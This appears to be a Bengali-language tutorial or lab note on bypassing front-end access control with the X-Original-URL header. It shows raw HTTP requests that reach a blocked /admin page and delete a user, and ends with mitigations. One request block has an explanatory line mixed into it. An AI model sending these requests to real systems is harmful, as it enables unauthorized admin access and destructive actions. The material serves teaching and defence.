# X-Original-URL Header Bypass

## উদ্দেশ্য

যদি Front-end এবং Back-end URL আলাদাভাবে প্রসেস করে, তাহলে `X-Original-URL` Header ব্যবহার করে Access Control বাইপাস করা সম্ভব।

---

## পূর্বশর্ত

- Front-end `/admin` Block করে।
- Back-end `X-Original-URL` Header Trust করে।
- Front-end এই Header Remove বা Validate করে না।

---

## আক্রমণের ধাপ

### ১. Block হওয়া Request ধরুন

```
GET /admin HTTP/1.1
Host: target.com
```

---

### ২. `X-Original-URL` যোগ করুন

```
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

Back-end `X-Original-URL` অনুযায়ী Request প্রসেস করবে এবং Admin Page Access হতে পারে।

---

### ৩. Protected Action করুন

```
GET /?username=carlos HTTP/1.1
Host: target.com
X-Original-URL: admin/delete

GET এর পরের অংশটি হলো ফায়ারওয়ালকে ফাঁকি দেওয়ার জন্য Fake বা মুখোশ, আর X-Original-Url এর পরের অংশটি হলো হ্যাকারের Main বা আসল উদ্দেশ্য।
```

Back-end এটিকে `/admin/delete?username=carlos` হিসেবে প্রসেস করবে।

---

## কেন এটি কাজ করে

Front-end শুধুমাত্র Request Line-এর URL যাচাই করে, কিন্তু Back-end `X-Original-URL` Header-কে আসল URL হিসেবে ব্যবহার করে। ফলে Front-end-এর Access Control এড়িয়ে Protected Endpoint-এ পৌঁছানো যায়।

---

## Impact

- Access Control Bypass
- Unauthorized Admin Access
- Privilege Escalation
- Sensitive Action Execution

---

## Mitigation

- `X-Original-URL` এবং `X-Rewrite-URL` Header Trust করা যাবে না।
- Front-end ও Back-end-এ একই Authorization Policy প্রয়োগ করতে হবে।
- Reverse Proxy থেকে অপ্রয়োজনীয় Rewrite Header Remove করতে হবে।
- প্রতিটি Sensitive Endpoint-এ Server-side Authorization Check করতে হবে।
